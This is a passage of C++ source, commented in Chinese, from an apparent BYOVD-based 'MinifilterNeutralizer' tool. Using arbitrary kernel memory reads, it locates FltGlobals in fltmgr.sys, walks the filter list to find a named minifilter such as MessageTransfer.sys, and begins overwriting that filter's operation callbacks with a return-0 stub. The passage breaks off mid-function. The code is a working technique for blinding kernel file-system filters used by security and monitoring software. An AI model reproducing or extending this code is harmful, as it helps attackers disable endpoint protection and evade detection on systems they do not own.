    uint64_t dataStart = 0, dataEnd = 0;
    for (WORD i = 0; i < numSections; i++) {
        // .data 段特征: 可读写, 名称包含 "data" 或 ".data"
        bool isData = (sections[i].Characteristics & IMAGE_SCN_MEM_READ) &&
                       (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
                       !(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE);
        if (isData) {
            uint64_t secVA = fltmgrBase + sections[i].VirtualAddress;
            uint64_t secEnd = secVA + sections[i].Misc.VirtualSize;
            // 取最大的 RW 段 (通常是 .data)
            if ((secEnd - secVA) > (dataEnd - dataStart)) {
                dataStart = secVA;
                dataEnd = secEnd;
            }
        }
    }
    // ★ BUILD 494: sections 延迟释放 — .text 段扫描还需要用它 (修复 USE-AFTER-FREE 崩溃)

    if (!dataStart || !dataEnd || dataEnd <= dataStart) {
        // 无法解析段 → 回退到估算范围
        dataStart = fltmgrBase + 0x2000;
        dataEnd   = fltmgrBase + (imageSize < 0x200000 ? imageSize : 0x200000);
        ByovdDiag("FLT:NTRL: .data scan - section parse failed, using estimated range +0x%llX..+0x%llX\n",
            dataStart - fltmgrBase, dataEnd - fltmgrBase);
    } else {
        ByovdDiag("FLT:NTRL: .data scan - parsed .data at +0x%llX..+0x%llX (%llu KB)\n",
            dataStart - fltmgrBase, dataEnd - fltmgrBase, (dataEnd - dataStart) / 1024);
    }

    // 分块扫描 .data 段 — VirtualAlloc 代替 std::vector
    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!chunk) {
        ByovdDiag("FLT:NTRL: .data scan - VirtualAlloc for chunk failed\n");
        return 0;
    }

    // ★ 候选数组 (固定大小, 最大 64 个, 避免 std::vector CRT 依赖)
    struct Candidate { uint64_t addr; int refCount; };
    Candidate candidates[64] = {};
    int candidateCount = 0;

    for (uint64_t addr = dataStart; addr < dataEnd; addr += 0x10000) {
        uint64_t chunkEnd = (addr + 0x10000 < dataEnd) ? addr + 0x10000 : dataEnd;
        uint64_t chunkSize = chunkEnd - addr;
        if (!kma.ReadKernelVA(addr, chunk, chunkSize))
            continue;

        for (size_t off = 0; off + 16 <= chunkSize; off += 8) {
            uint64_t flink = *(uint64_t*)(chunk + off);
            uint64_t blink = *(uint64_t*)(chunk + off + 8);

            // 基本验证: 两个指针都是内核地址
            if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL)
                continue;

            // ★ 关键: Flink/Blink 必须在 fltmgr 模块范围 (FLTP_FRAME 在 fltmgr 内)
            if (flink < fltmgrBase || flink >= fltmgrBase + imageSize)
                continue;
            if (blink < fltmgrBase || blink >= fltmgrBase + imageSize)
                continue;

            // ★ 验证回指: Flink->Blink 应指向此 LIST_ENTRY 头
            uint64_t flinkBlink = 0;
            if (!kma.ReadKernelVA(flink + 8, &flinkBlink, 8))
                continue;
            if (flinkBlink != addr + off)
                continue;  // 不回指 → 不是双向链表头, 只是中间节点

            // 候选地址 = addr + off (FltGlobals 地址)
            uint64_t cand = addr + off;
            ByovdDiag("FLT:NTRL: .data scan candidate at fltmgr+0x%llX (Flink=+0x%llX Blink=+0x%llX ✓back-ref)\n",
                cand - fltmgrBase, flink - fltmgrBase, blink - fltmgrBase);
            if (candidateCount < 64) {
                candidates[candidateCount].addr = cand;
                candidates[candidateCount].refCount = 0;
                candidateCount++;
            }
        }
    }

    VirtualFree(chunk, 0, MEM_RELEASE);
    chunk = nullptr;

    if (candidateCount == 0) {
        ByovdDiag("FLT:NTRL: .data scan - no LIST_ENTRY head candidates found\n");
        return 0;
    }

    // ★ BUILD 492: 全量 .text 段扫描 — 替代原来仅扫描 6 个函数×1024 字节的局限方案.
    //   遍历 fltmgr.sys 整个 .text 段, 搜索所有 RIP-relative 和 MOV RAX,imm64 指令,
    //   统计每个候选 FltGlobals 地址被引用的次数.
    //   真正的 FltGlobals 会被 fltmgr 内部大量函数引用, refCount 远高于噪声.
    ByovdDiag("FLT:NTRL: cross-ref: full .text section scan (BUILD 492)...\n");

    // 找 .text 段
    uint64_t textStart = 0, textEnd = 0;
    for (WORD i = 0; i < numSections; i++) {
        char name[9] = {};
        memcpy(name, sections[i].Name, 8);
        if (strstr(name, ".text") || (sections[i].Characteristics & 0x20000000)) {
            textStart = fltmgrBase + sections[i].VirtualAddress;
            textEnd   = textStart + sections[i].Misc.VirtualSize;
            ByovdDiag("FLT:NTRL: cross-ref: .text at 0x%llX..0x%llX (%llu KB)\n",
                textStart, textEnd, (textEnd - textStart) / 1024);
            break;
        }
    }
    if (!textStart || !textEnd || textEnd <= textStart) {
        // 回退: 估算 .text 范围 (通常在 image 开头)
        textStart = fltmgrBase + 0x1000;
        textEnd   = fltmgrBase + 0x20000;  // 128KB 足够覆盖 fltmgr .text
        ByovdDiag("FLT:NTRL: cross-ref: .text fallback 0x%llX..0x%llX\n", textStart, textEnd);
    }

    // 分块读取 .text 段, 扫描每个候选的引用
    const SIZE_T TXT_CHUNK = 0x2000;  // 8KB chunks
    uint8_t* txtBuf = (uint8_t*)VirtualAlloc(nullptr, TXT_CHUNK, MEM_COMMIT, PAGE_READWRITE);
    if (!txtBuf) {
        VirtualFree(sections, 0, MEM_RELEASE);
        ByovdDiag("FLT:NTRL: cross-ref: VirtualAlloc failed\n");
        return 0;
    }

    for (uint64_t cur = textStart; cur < textEnd; cur += TXT_CHUNK) {
        SIZE_T readSize = (cur + TXT_CHUNK <= textEnd) ? TXT_CHUNK : (SIZE_T)(textEnd - cur);
        if (!kma.ReadKernelVA(cur, txtBuf, readSize)) continue;

        for (SIZE_T i = 0; i + 7 < readSize; i++) {
            // 模式1: REX.W LEA r64, [RIP+disp32]  → 48/4C 8D 05 XX XX XX XX
            // 模式2: REX.W MOV r64, [RIP+disp32]  → 48/4C 8B 05 XX XX XX XX
            if ((txtBuf[i] == 0x48 || txtBuf[i] == 0x4C) &&
                (txtBuf[i+1] == 0x8D || txtBuf[i+1] == 0x8B) &&
                (txtBuf[i+2] & 0xC7) == 0x05) {
                int32_t rel32 = *(int32_t*)(txtBuf + i + 3);
                uint64_t target = cur + i + 7 + rel32;
                for (int ci = 0; ci < candidateCount; ci++) {
                    if (target == candidates[ci].addr) {
                        candidates[ci].refCount++;
                    }
                }
            }
            // 模式3: MOV RAX/R10-R15, imm64 → 48/49/4C/4D B8~BF + imm64
            else if (i + 9 < readSize &&
                     ((txtBuf[i] == 0x48 || txtBuf[i] == 0x49 || txtBuf[i] == 0x4C || txtBuf[i] == 0x4D) &&
                      (txtBuf[i+1] & 0xF8) == 0xB8)) {
                uint64_t absAddr = *(uint64_t*)(txtBuf + i + 2);
                for (int ci = 0; ci < candidateCount; ci++) {
                    if (absAddr == candidates[ci].addr) {
                        candidates[ci].refCount++;
                    }
                }
            }
        }
    }

    VirtualFree(txtBuf, 0, MEM_RELEASE);
    VirtualFree(sections, 0, MEM_RELEASE);

    // 选择 refCount 最高的候选
    int bestIdx = -1;
    int bestRef = 0;
    for (int ci = 0; ci < candidateCount; ci++) {
        ByovdDiag("FLT:NTRL: .data candidate +0x%llX refCount=%d\n",
            candidates[ci].addr - fltmgrBase, candidates[ci].refCount);
        if (candidates[ci].refCount > bestRef) {
            bestRef = candidates[ci].refCount;
            bestIdx = ci;
        }
    }

    if (bestIdx >= 0 && bestRef >= 2) {
        // ★ 至少 2 次引用才认为有效 (排除噪声)
        ByovdDiag("FLT:NTRL: .data scan BEST candidate at fltmgr+0x%llX (refCount=%d) ✓ CONFIRMED\n",
            candidates[bestIdx].addr - fltmgrBase, bestRef);
        return candidates[bestIdx].addr;
    }

    if (bestIdx >= 0 && bestRef == 1) {
        ByovdDiag("FLT:NTRL: .data scan — only 1 ref, WEAK confidence at fltmgr+0x%llX\n",
            candidates[bestIdx].addr - fltmgrBase);
        return candidates[bestIdx].addr;
    }

    ByovdDiag("FLT:NTRL: .data scan — ALL refCount=0, FltGlobals NOT FOUND (full .text scan)\n");
    return 0;
}

// ============================================================
// BUILD 455/457: 多函数 fallback 查找 FltGlobals + MOV 变体
// 先 LEA 后 MOV 扫描 RIP-relative 指令 → fltmgr .data 段
// ★ BUILD 475: sigscan 失败后自动 fallback 到 .data section scan
uint64_t MinifilterNeutralizer::FindFltGlobals(uint64_t fltmgrBase) {
    const char* exportNames[] = {
        "FltEnlistFilterForDriverInterface",  // Win10 21H2+ (主路径)
        "FltGetVolumeFromName",               // 所有版本通用
        "FltGetVolumeFromFileObject",         // 所有版本通用
        "FltRegisterFilter",                  // 所有版本通用 (最可靠)
        "FltStartFiltering",                  // 所有版本通用
        "FltUnregisterFilter",                // 所有版本通用
        "FltGetFileNameInformation",          // 所有版本通用
        "FltQueryInformationFile",           // 所有版本通用
        "FltCreateFile",                      // 所有版本通用
        "FltReadFile",                        // 所有版本通用
        "FltInitializePushLock",             // 所有版本通用
    };

    for (const char* exportName : exportNames) {
        uint64_t targetFunc = KernelMemoryAccessor::Instance().ResolveExport(fltmgrBase, exportName);
        if (!targetFunc) {
            ByovdDiag("FLT:NTRL: %s not exported\n", exportName);
            continue;
        }
        uint64_t candidate = ScanFuncForFltGlobals(fltmgrBase, targetFunc);
        if (candidate) {
            // ★ BUILD 461: 验证候选地址 — 读取前 8 字节, 必须是有效内核地址
            uint64_t firstQword = 0;
            if (KernelMemoryAccessor::Instance().ReadKernelVA(candidate, &firstQword, 8)) {
                if (firstQword >= 0xFFFF800000000000ULL && firstQword < 0xFFFFFFFFFFFFFFFFULL) {
                    // ★ BUILD 472: 二级验证 — 读 qword[0] 指向的地址,
                    //   扫 FilterList 偏移, 必须有 LIST_ENTRY 特征 (Flink/Blink 都是内核地址)
                    for (uint32_t flOff = 0x100; flOff <= 0x2C0; flOff += 8) {
                        uint64_t flPair[2] = {};
                        if (KernelMemoryAccessor::Instance().ReadKernelVA(
                                firstQword + flOff, flPair, 16)) {
                            if (flPair[0] >= 0xFFFF800000000000ULL &&
                                flPair[1] >= 0xFFFF800000000000ULL) {
                                ByovdDiag("FLT:NTRL: FltGlobals at 0x%llX (via %s) struct-verified (flOff=0x%X Flink=0x%llX)\n",
                                    (unsigned long long)candidate, exportName,
                                    flOff, (unsigned long long)flPair[0]);
                                return candidate;
                            }
                        }
                    }
                    ByovdDiag("FLT:NTRL: %s candidate 0x%llX qword[0]=0x%llX valid ptr but no LIST_ENTRY found\n",
                        exportName, (unsigned long long)candidate, (unsigned long long)firstQword);
                    // fall through — try next export
                } else {
                    ByovdDiag("FLT:NTRL: %s candidate 0x%llX rejected (qword=0x%016llX not kernel ptr)\n",
                        exportName, (unsigned long long)candidate, (unsigned long long)firstQword);
                }
            }
        } else {
            ByovdDiag("FLT:NTRL: %s found but no .data LEA/MOV ref\n", exportName);
        }
    }
    ByovdDiag("FLT:NTRL: FltGlobals not found via any export\n");

    // ★ BUILD 475: sigscan 失败 → fallback 到 .data section 直接扫描
    ByovdDiag("FLT:NTRL: falling back to .data section scan (BUILD 475)...\n");
    uint64_t dataScanResult = ScanDataSectionForFltGlobals(fltmgrBase);
    if (dataScanResult) {
        ByovdDiag("FLT:NTRL: .data scan SUCCESS at 0x%llX\n", (unsigned long long)dataScanResult);
        return dataScanResult;
    }

    return 0;
}

// ============================================================
// ★ BUILD 502: Win11 直接字符串扫描 — 绕过 FrameList 依赖
// ============================================================
static uint64_t FindFilterByStringScan(uint64_t fltmgrBase, const wchar_t* targetName) {
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("FLT:STRSCAN: === BUILD 502 direct string scan ===\n");
    char drvName[64] = {};
    int nameLen = 0;
    while (targetName[nameLen] && nameLen < 60) nameLen++;
    for (int i = 0; i < nameLen; i++) drvName[i] = (char)targetName[i];
    drvName[nameLen] = '.'; drvName[nameLen+1] = 's'; drvName[nameLen+2] = 'y'; drvName[nameLen+3] = 's'; drvName[nameLen+4] = 0;
    uint64_t mtBase = kma.GetKernelModuleBase(drvName);
    if (!mtBase) { ByovdDiag("FLT:STRSCAN: %s not loaded\n", drvName); return 0; }
    uint64_t mtSize = 0;
    IMAGE_DOS_HEADER mtdos = {};
    if (kma.ReadKernelVA(mtBase, &mtdos, sizeof(mtdos)) && mtdos.e_magic == IMAGE_DOS_SIGNATURE) {
        IMAGE_NT_HEADERS64 mtnt = {};
        if (kma.ReadKernelVA(mtBase + mtdos.e_lfanew, &mtnt, sizeof(mtnt)) && mtnt.Signature == IMAGE_NT_SIGNATURE)
            mtSize = mtnt.OptionalHeader.SizeOfImage;
    }
    if (!mtSize) mtSize = 0x100000;
    ByovdDiag("FLT:STRSCAN: %s at 0x%llX size=0x%llX\n", drvName, (unsigned long long)mtBase, (unsigned long long)mtSize);

    IMAGE_DOS_HEADER dos = {};
    if (!kma.ReadKernelVA(fltmgrBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS64 nt = {};
    if (!kma.ReadKernelVA(fltmgrBase + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) return 0;
    WORD numSections = nt.FileHeader.NumberOfSections;
    DWORD secTableSize = numSections * sizeof(IMAGE_SECTION_HEADER);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)VirtualAlloc(nullptr, secTableSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!sections) return 0;
    if (!kma.ReadKernelVA(fltmgrBase + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64), sections, secTableSize)) { VirtualFree(sections,0,MEM_RELEASE); return 0; }
    uint64_t dataStart = 0, dataEnd = 0;
    for (WORD i = 0; i < numSections; i++) {
        if ((sections[i].Characteristics & (IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE)) == (IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE) &&
            !(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            uint64_t v = fltmgrBase + sections[i].VirtualAddress, e = v + sections[i].Misc.VirtualSize;
            if ((e-v) > (dataEnd-dataStart)) { dataStart = v; dataEnd = e; }
        }
    }
    if (!dataStart) { dataStart = fltmgrBase+0x2000; dataEnd = fltmgrBase+nt.OptionalHeader.SizeOfImage; }
    ByovdDiag("FLT:STRSCAN: .data +0x%llX..+0x%llX (%llu KB)\n", dataStart-fltmgrBase, dataEnd-fltmgrBase, (dataEnd-dataStart)/1024);

    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!chunk) { VirtualFree(sections,0,MEM_RELEASE); return 0; }
    struct UHit { uint64_t uniAddr; uint64_t bufAddr; };
    UHit hits[32] = {}; int hitCount = 0;
    uint64_t mtEnd = mtBase + mtSize;
    for (uint64_t addr = dataStart; addr < dataEnd; addr += 0x10000) {
        uint64_t cEnd = (addr+0x10000 < dataEnd) ? addr+0x10000 : dataEnd;
        if (!kma.ReadKernelVA(addr, chunk, cEnd-addr)) continue;
        for (size_t off = 0; off+8 <= (cEnd-addr); off += 8) {
            uint64_t ptr = *(uint64_t*)(chunk+off);
            if (ptr < mtBase || ptr >= mtEnd) continue;
            uint64_t uniAddr = addr+off-8;
            if (uniAddr < dataStart) continue;
            uint16_t uniLen = *(uint16_t*)(chunk+off-8);
            if (uniLen==0 || uniLen>256 || (uniLen&1)) continue;
            uint16_t uniMax = *(uint16_t*)(chunk+off-6);
            if (uniMax < uniLen || uniMax > 512) continue;
            wchar_t strBuf[128] = {};
            if (!kma.ReadKernelVA(ptr, strBuf, (uniLen<254)?uniLen:254)) continue;
            strBuf[(uniLen<254)?uniLen/2:127] = 0;
            if (_wcsicmp(strBuf, targetName) != 0) continue;
            ByovdDiag("FLT:STRSCAN: HIT '%ls' UNI at fltmgr+0x%llX buf=0x%llX len=%u\n", strBuf, uniAddr-fltmgrBase, (unsigned long long)ptr, uniLen);
            if (hitCount < 32) { hits[hitCount].uniAddr=uniAddr; hits[hitCount].bufAddr=ptr; hitCount++; }
        }
    }
    VirtualFree(chunk,0,MEM_RELEASE);
    VirtualFree(sections,0,MEM_RELEASE);
    if (hitCount == 0) { ByovdDiag("FLT:STRSCAN: no UNICODE_STRING for '%ls'\n", targetName); return 0; }
    ByovdDiag("FLT:STRSCAN: %d hits for '%ls'\n", hitCount, targetName);

    for (int hi = 0; hi < hitCount; hi++) {
        uint64_t uniAddr = hits[hi].uniAddr;
        for (uint64_t nameOff = 0x38; nameOff <= 0x300; nameOff += 8) {
            uint64_t fb = uniAddr - nameOff;
            if (fb < fltmgrBase || fb >= fltmgrBase + nt.OptionalHeader.SizeOfImage) continue;
            uint64_t flink=0, blink=0; uint32_t flags=0;
            if (!kma.ReadKernelVA(fb+0x08,&flink,8)) continue;
            if (!kma.ReadKernelVA(fb+0x10,&blink,8)) continue;
            if (!kma.ReadKernelVA(fb+0x00,&flags,4)) continue;
            if (flink<0xFFFF800000000000ULL || blink<0xFFFF800000000000ULL) continue;
            if (flags > 0x10000) continue;
            uint64_t opsOffs[] = {0x228,0x238,0x248,0x258,0x268,0x278,0x288,0x298,0x2A0,0x2A8,0x2B0,0x2B8,0x2C0,0x2C8,0x2D0,0x2D8,0x2E0,0x2E8,0x2F0,0x2F8,0x300};
            for (uint64_t oo : opsOffs) {
                uint64_t val=0;
                if (kma.ReadKernelVA(fb+oo,&val,8) && val>0xFFFF800000000000ULL) {
                    uint8_t mj=0; uint64_t rp=0;
                    if (kma.ReadKernelVA(val,&rp,8) && rp>0xFFFF800000000000ULL) {
                        if (kma.ReadKernelVA(rp,&mj,1) && (mj<=0x1B||mj==0x80)) {
                            ByovdDiag("FLT:STRSCAN: FLT_FILTER at fltmgr+0x%llX (nameOff=0x%llX opsOff=0x%llX ops=0x%llX)\n", fb-fltmgrBase, nameOff, oo, (unsigned long long)val);
                            return fb;
                        }
                    }
                }
            }
        }
    }
    ByovdDiag("FLT:STRSCAN: found UNICODE_STRING but could not validate FLT_FILTER\n");
    return 0;
}

// 在 FilterList 中查找指定名称的 FLT_FILTER
uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t fltGlobals, const wchar_t* name) {
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("FLT:NTRL: finding filter '%ls'\n", name);

    // BUILD 466 + BUILD 475: FltGlobals 在 Win10/11 版本间布局不同
    //   不再假设 FrameList 在 +0x00 — 尝试 fltGlobals 前 8 个 qword (Win11 可能更远)
    uint64_t globQw[8] = {};
    for (int i = 0; i < 8; i++) {
        kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
    }
    ByovdDiag("FLT:NTRL: FltGlobals hex: %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX\n",
        (unsigned long long)globQw[0], (unsigned long long)globQw[1],
        (unsigned long long)globQw[2], (unsigned long long)globQw[3],
        (unsigned long long)globQw[4], (unsigned long long)globQw[5],
        (unsigned long long)globQw[6], (unsigned long long)globQw[7]);

    // FLTP_FRAME.FilterList 偏移 (BUILD 475: 扩展到 0x300)
    uint64_t filterOffsets[] = { 
        0x138, 0x140, 0x148, 0x150, 0x158, 0x160, 0x168, 0x170, 0x178, 0x180,
        0x188, 0x190, 0x198, 0x1A0, 0x1A8, 0x1B0, 0x1B8, 0x1C0, 0x1C8, 0x1D0,
        0x1D8, 0x1E0, 0x1E8, 0x1F0, 0x1F8, 0x200, 0x208, 0x210, 0x218, 0x220,
        0x228, 0x230, 0x238, 0x240, 0x248, 0x250, 0x258, 0x260, 0x268, 0x270,
        0x278, 0x280, 0x288, 0x290, 0x298, 0x2A0, 0x2A8, 0x2B0, 0x2B8, 0x2C0,
        0x2C8, 0x2D0, 0x2D8, 0x2E0, 0x2E8, 0x2F0, 0x2F8, 0x300,
    };

    uint64_t filterListHead = 0;
    uint64_t frameList = 0;

    // ★ BUILD 466: 尝试每个 qword 作为 FrameList 指针 (BUILD 475: 尝试 8 个)
    for (int qi = 0; qi < 8 && !filterListHead; qi++) {
        uint64_t candidateFrame = globQw[qi];
        if (candidateFrame < 0xFFFF800000000000ULL) continue;

        // 验证 candidateFrame 指向的数据是否有效
        uint64_t firstQw = 0;
        if (!kma.ReadKernelVA(candidateFrame, &firstQw, 8)) continue;
        if (firstQw < 0xFFFF800000000000ULL) {
            ByovdDiag("FLT:NTRL: qword[%d]=%016llX rejected (data not kernel ptr)\n",
                qi, (unsigned long long)candidateFrame);
            continue;
        }

        ByovdDiag("FLT:NTRL: try qword[%d]=%016llX as FrameList\n",
            qi, (unsigned long long)candidateFrame);

        for (uint64_t off : filterOffsets) {
            uint64_t addr = candidateFrame + off;
            uint64_t flink = 0, blink = 0;
            if (kma.ReadKernelVA(addr, &flink, sizeof(flink)) &&
                kma.ReadKernelVA(addr + 8, &blink, sizeof(blink))) {
                if (flink != addr && flink > 0xFFFF800000000000ULL && blink > 0xFFFF800000000000ULL) {
                    filterListHead = addr;
                    frameList = candidateFrame;
                    ByovdDiag("FLT:NTRL: FilterList at +0x%llX via qword[%d]\n", off, qi);
                    break;
                }
            }
        }
    }

    if (!filterListHead) {
        ByovdDiag("FLT:NTRL: FilterList not found in any frame candidate\n");

        // 诊断: dump 每个候选的前 4 qword
        for (int qi = 0; qi < 8; qi++) {
            uint64_t cf = globQw[qi];
            if (cf < 0xFFFF800000000000ULL) continue;
            ByovdDiag("FLT:NTRL: frame[%d] hex: ", qi);
            for (int j = 0; j < 4; j++) {
                uint64_t qw = 0;
                kma.ReadKernelVA(cf + j*8, &qw, 8);
                ByovdDiag("%016llX ", (unsigned long long)qw);
            }
            ByovdDiag("\n");
        }
        // ★ BUILD 502: FrameList 失败 → 尝试字符串扫描
        ByovdDiag("FLT:NTRL: FrameList failed, trying BUILD 502 string scan...\n");
        uint64_t strScanResult = FindFilterByStringScan(fltmgrBase, name);
        if (strScanResult) {
            ByovdDiag("FLT:NTRL: BUILD 502 string scan SUCCESS at 0x%llX\n", (unsigned long long)strScanResult);
            return strScanResult;
        }
        return 0;
    }

    // 遍历 FilterList 链表
    // FLT_FILTER.ActiveLink 在 FLT_FILTER + 0x008
    // Name.UNICODE_STRING 的偏移需要运行时检测
    // ★ BUILD 477: Win11 FLT_FILTER 更大, 扩展到 0x38..0x300
    uint64_t nameOffsets[] = {
        0x038, 0x040, 0x048, 0x058, 0x068, 0x078,
        0x088, 0x098, 0x0A8, 0x0B8, 0x0C8, 0x0D8,
        0x0E8, 0x0F8, 0x108, 0x118, 0x128, 0x138,
        0x148, 0x158, 0x168, 0x178, 0x188, 0x198,
        0x1A8, 0x1B8, 0x1C8, 0x1D8, 0x1E8, 0x1F8,
        0x208, 0x218, 0x228, 0x238, 0x248, 0x258,
        0x268, 0x278, 0x288, 0x298, 0x2A8, 0x2B8,
        0x2C8, 0x2D8, 0x2E8, 0x2F8, 0x300,
    };

    uint64_t current = 0;
    if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current)))
        return 0;

    for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
        // current = &(FLT_FILTER.ActiveLink), FLT_FILTER 基址 = current - 0x008
        uint64_t filterBase = current - 0x008;

        // 尝试不同偏移读取 Name
        for (uint64_t nameOff : nameOffsets) {
            uint16_t nameLen = 0;
            uint64_t nameBuf = 0;
            uint64_t uniAddr = filterBase + nameOff;

            if (kma.ReadKernelVA(uniAddr, &nameLen, sizeof(nameLen)) &&
                kma.ReadKernelVA(uniAddr + 8, &nameBuf, sizeof(nameBuf))) {

                if (nameLen > 0 && nameLen <= 256 && nameLen % 2 == 0 &&
                    nameBuf > 0xFFFF800000000000ULL) {

                    // ★ BUILD 500: 固定数组替代 std::wstring — 避免 CRT 堆依赖
                    wchar_t filterName[256] = {};
                    ReadKernelUnicodeString(nameBuf, nameLen, filterName, 256);
                    if (_wcsicmp(filterName, name) == 0) {
                        ByovdDiag("FLT:NTRL: found '%ls' at 0x%llX (nameOff=0x%llX)\n",
                            filterName, (unsigned long long)filterBase, nameOff);
                        return filterBase;
                    }
                }
            }
        }

        // 下一个: current → ActiveLink.Flink
        if (!kma.ReadKernelVA(current, &current, sizeof(current)))
            break;
    }

    ByovdDiag("FLT:NTRL: filter '%ls' not found in FilterList\n", name);

    // ★ BUILD 477: 名称匹配失败 → fallback: 通过回调地址范围匹配
    //   遍历 FilterList, 对每个 FLT_FILTER 读取 Operations 中的回调地址,
    //   检查是否有回调落在目标驱动模块范围内
    //   优点: 不依赖 Name 偏移, 适用于 Win10/11 所有 FLT_FILTER 布局版本
    ByovdDiag("FLT:NTRL: falling back to callback-address-range matching (BUILD 477)...\n");

    // 获取 MessageTransfer.sys 基址和大小
    uint64_t mtBase = kma.GetKernelModuleBase("MessageTransfer.sys");
    uint64_t mtSize = 0;
    if (mtBase) {
        // 读 PE 头获取 SizeOfImage
        IMAGE_DOS_HEADER mtdos = {};
        if (kma.ReadKernelVA(mtBase, &mtdos, sizeof(mtdos)) && mtdos.e_magic == IMAGE_DOS_SIGNATURE) {
            IMAGE_NT_HEADERS64 mtnt = {};
            uint64_t mtNtHdr = mtBase + mtdos.e_lfanew;
            if (kma.ReadKernelVA(mtNtHdr, &mtnt, sizeof(mtnt)) && mtnt.Signature == IMAGE_NT_SIGNATURE) {
                mtSize = mtnt.OptionalHeader.SizeOfImage;
            }
        }
    }

    if (!mtBase || !mtSize) {
        ByovdDiag("FLT:NTRL: callback-range fallback SKIP — MessageTransfer.sys not loaded\n");
        return 0;
    }
    ByovdDiag("FLT:NTRL: MessageTransfer.sys at 0x%llX size=0x%llX\n",
        (unsigned long long)mtBase, (unsigned long long)mtSize);

    // 重新遍历 FilterList, 通过回调地址匹配
    if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current))) return 0;

    // Operations 指针偏移 — BUILD 477 扩展到更大范围
    uint64_t opsOffsets[] = {
        0x228, 0x238, 0x248, 0x258, 0x268, 0x278, 0x288, 0x298,
        0x2A0, 0x2A8, 0x2B0, 0x2B8, 0x2C0, 0x2C8, 0x2D0, 0x2D8,
        0x2E0, 0x2E8, 0x2F0, 0x2F8, 0x300,
    };

    for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
        uint64_t filterBase = current - 0x008;

        // 尝试读取 Operations 指针
        uint64_t opsAddr = 0;
        uint64_t matchedOpsOff = 0;
        for (uint64_t opsOff : opsOffsets) {
            if (kma.ReadKernelVA(filterBase + opsOff, &opsAddr, sizeof(opsAddr))) {
                if (opsAddr > 0xFFFF800000000000ULL) {
                    matchedOpsOff = opsOff;
                    break; // 找到可能的 Operations 指针
                }
            }
        }

        if (opsAddr > 0xFFFF800000000000ULL) {
            // 读取 Operations 首条记录的地址 (FLT_OPERATION_REGISTRATION 数组)
            // Operations 是一个指针, 指向 FLT_OPERATION_REGISTRATION 数组
            uint64_t regArray = 0;
            if (kma.ReadKernelVA(opsAddr, &regArray, sizeof(regArray))) {
                // regArray 可能是 FLT_OPERATION_REGISTRATION 数组的地址
                // 检查前 8 个条目的回调是否在 MessageTransfer 模块范围内
                for (int ri = 0; ri < 8; ri++) {
                    // FLT_OPERATION_REGISTRATION:
                    //   +0x00: MajorFunction (1 byte)
                    //   +0x04: Flags (4 bytes)
                    //   +0x08: PreOperation (8 bytes)
                    //   +0x10: PostOperation (8 bytes)
                    uint64_t preOp = 0, postOp = 0;
                    kma.ReadKernelVA(regArray + ri * 0x18 + 0x08, &preOp, sizeof(preOp));
                    kma.ReadKernelVA(regArray + ri * 0x18 + 0x10, &postOp, sizeof(postOp));

                    if ((preOp >= mtBase && preOp < mtBase + mtSize) ||
                        (postOp >= mtBase && postOp < mtBase + mtSize)) {
                        ByovdDiag("FLT:NTRL: callback-range MATCH! filter at 0x%llX (opsOff=0x%llX, preOp=0x%llX postOp=0x%llX)\n",
                            (unsigned long long)filterBase, matchedOpsOff,
                            (unsigned long long)preOp, (unsigned long long)postOp);
                        return filterBase;
                    }
                }
            }
        }

        if (!kma.ReadKernelVA(current, &current, sizeof(current)))
            break;
    }

    ByovdDiag("FLT:NTRL: callback-range fallback also failed\n");
    // ★ BUILD 502: 最后尝试字符串扫描
    ByovdDiag("FLT:NTRL: last resort — BUILD 502 string scan...\n");
    uint64_t strScanResult2 = FindFilterByStringScan(fltmgrBase, name);
    if (strScanResult2) {
        ByovdDiag("FLT:NTRL: BUILD 502 string scan SUCCESS at 0x%llX\n", (unsigned long long)strScanResult2);
        return strScanResult2;
    }
    return 0;
}

// 替换 FLT_FILTER.Operations 数组中所有回调为无害 stub
bool MinifilterNeutralizer::NeutralizeCallbacks(uint64_t filterAddr) {
    auto& kma = KernelMemoryAccessor::Instance();

    // 获取 fltmgr.sys 基址用于 stub 扫描
    uint64_t fltmgrBase = kma.GetKernelModuleBase("fltmgr.sys");
    if (!fltmgrBase) {
        ByovdDiag("FLT:NTRL: fltmgr.sys not found\n");
        return false;
    }

    // 找到 return-0 stub 地址
    uint64_t stubAddr = FindRet0Stub(fltmgrBase, 0x400000);
    if (!stubAddr) return false;

    // Operations 指针偏移 — 尝试常见值
    uint64_t opsOffsets[] = { 0x2A8, 0x2B8, 0x2C8, 0x2A0, 0x2B0 };
    uint64_t opsAddr = 0;

    for (uint64_t off : opsOffsets) {
        uint64_t val = 0;
        if (kma.ReadKernelVA(filterAddr + off, &val, sizeof(val))) {
            // Operations 数组应在内核池中 (高地址), 不在 fltmgr 模块内
            if (val > 0xFFFF800000000000ULL && val < 0xFFFFFFFFFFFFFFFFULL) {
                // ★ v3.126n-review: 加强验证 — 检查前 3 个条目的 MJ 是否均为合法 IRP_MJ_* 值
                bool valid = true;
                for (int checkIdx = 0; checkIdx < 3; checkIdx++) {
                    uint8_t mj = 0;
